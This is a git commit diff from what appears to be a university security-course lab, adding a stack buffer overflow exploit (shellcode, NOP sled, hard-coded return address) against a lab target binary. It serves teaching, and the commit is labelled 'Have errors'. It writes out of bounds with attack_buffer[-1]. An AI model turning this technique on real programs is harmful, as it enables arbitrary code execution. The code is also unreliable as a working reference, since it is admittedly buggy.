3f4e4dd25feeecd706f112b2dd07ae72ea214094
Weizhou Wang <weizhou.wang@mail.utoronto.ca>
2022-10-03 18:37:16 -0400

    Have errors

--- ece568-lab1-2022f/sploits/sploit1.c
+++ ece568-lab1-2022f/sploits/sploit1.c
@@ -6,14 +6,45 @@
 
 #define TARGET "../targets/target1"
 
+#define BUFFER_SIZE 353
+#define BUFFER_ADDR 0x0000000040a4fd70
+
 int
 main ( int argc, char * argv[] )
 {
     char *    args[3];
     char *    env[1];
 
+    // Create the attack buffer
+    char attack_buffer[BUFFER_SIZE + 1];
+
+    // Fill in with the return address
+    
+    // for (int i = 0; i < 288; i += 8) {
+    //     *(addr_ptr++) = BUFFER_ADDR;
+    // }
+
+    // Place the shell code at the front
+    int i;
+    for (i = 0; i < strlen(shellcode); ++i) {
+        attack_buffer[i] = shellcode[i];
+    }
+
+    // Fill in with NOP
+    for (; i < BUFFER_SIZE - 9; ++i) {
+        attack_buffer[i] = 0x90;
+    }
+
+    // Overwrite the return address
+    long *addr_ptr = (long *)(attack_buffer+i);
+    *addr_ptr = BUFFER_ADDR;
+
+    // The string should end with null
+    attack_buffer[-1] = '\0';
+
+    // Fill in the parameters
     args[0] = TARGET;
-    args[1] = "hi there";
+    args[1] = attack_buffer;
     args[2] = NULL;
 
     env[0] = NULL;
